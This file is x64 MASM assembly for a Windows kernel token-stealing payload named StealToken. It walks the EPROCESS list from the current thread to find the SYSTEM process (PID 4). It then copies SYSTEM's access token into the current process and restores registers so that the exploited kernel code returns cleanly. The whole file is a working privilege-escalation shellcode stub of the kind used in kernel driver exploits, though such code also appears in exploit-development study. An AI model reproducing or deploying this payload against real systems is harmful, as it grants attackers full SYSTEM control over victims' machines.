.code
PUBLIC StealToken
StealToken   proc

; Start of Token Stealing Stub

xor rax, rax                    ; Set ZERO
mov rax, gs:[rax + 188h]        ; Get nt!_KPCR.PcrbData.CurrentThread
                                ; _KTHREAD is located at GS : [0x188]

mov rax, [rax + 0B8h]            ; Get nt!_KTHREAD.ApcState.Process
mov rcx, rax                    ; Copy current process _EPROCESS structure
;mov r11, rcx                     Store Token.RefCnt
;and r11, 7

mov rdx, 4h                     ; SYSTEM process PID = 0x4

SearchSystemPID:
mov rax, [rax + 2f0h]           ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
sub rax, 2f0h
cmp rdx, [rax + 2e8h]           ; Get nt!_EPROCESS.UniqueProcessId
jne SearchSystemPID

mov rdx, [rax + 358h]           ; Get SYSTEM process nt!_EPROCESS.Token
;and rdx, 0fffffffffffffff0h
;or rdx, r11
mov [rcx + 358h], rdx            ; Replace target process nt!_EPROCESS.Token
                                ; with SYSTEM process nt!_EPROCESS.Token
                                ; End of Token Stealing Stub

; We still need to reconstruct a valid response

xor rax, rax                     ;Set NTSTATUS SUCCEESS

;restoring corrupted registers
mov rbx, 3
mov rsi, 3221225659
mov rdi, 4
xor r12, r12
xor r15, r15
mov r14, [rsp+60h]   
add r14, 208

; pointing rsp to return address
add rsp, 10h
ret

StealToken ENDP
end